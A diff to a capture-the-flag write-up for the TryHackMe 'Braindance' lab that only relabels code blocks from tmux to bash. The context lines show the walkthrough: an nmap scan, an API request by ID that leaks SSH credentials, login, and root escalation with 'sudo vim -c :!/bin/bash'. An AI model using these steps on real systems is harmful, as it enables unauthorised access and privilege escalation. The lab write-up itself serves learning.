@@ -28,7 +28,7 @@ Braindance is a small "neurodance" shop: dance clips loaded straight into your m
 
 First, a port scan against the machine's ip.
 
-```tmux
+```bash
 nmap -sC -sV MACHINE_IP
 ```
 
@@ -54,7 +54,7 @@ I open the request properly and see it's calling `/api/dance.php?id=2`. Each cli
 
 ![Request details in the network panel](/images/writeups/TryHackMe_imágenes/Braindance-THM-imágenes/peticion_api-Braindance-THM.png)
 
-```tmux
+```bash
 curl http://MACHINE_IP/api/dance.php?id=1
 ```
 
@@ -66,7 +66,7 @@ And there it is: id 1 is a clip that was never meant to go live, and its interna
 
 With the credentials pulled from the API, I try connecting over SSH.
 
-```tmux
+```bash
 ssh braindancer@MACHINE_IP
 ```
 
@@ -74,7 +74,7 @@ ssh braindancer@MACHINE_IP
 
 I get in without issue. I check the user's home folder and there's the first flag.
 
-```tmux
+```bash
 ls
 cat user.txt
 ```
@@ -85,7 +85,7 @@ cat user.txt
 
 Once inside, the first thing I check is the user's sudo permissions.
 
-```tmux
+```bash
 sudo -l
 ```
 
@@ -93,7 +93,7 @@ sudo -l
 
 The user can run `/usr/bin/vim` as root with no password. Vim is one of the classic GTFOBins binaries for privilege escalation: once inside it, you can spawn a shell directly from the editor itself.
 
-```tmux
+```bash
 sudo vim -c ':!/bin/bash'
 ```
 
@@ -109,7 +109,7 @@ Here's a quick breakdown of what this command does:
 
 And with the root shell, I can now read the second flag.
 
-```tmux
+```bash
 cd /root/
 ls
 cat /root/root.txt
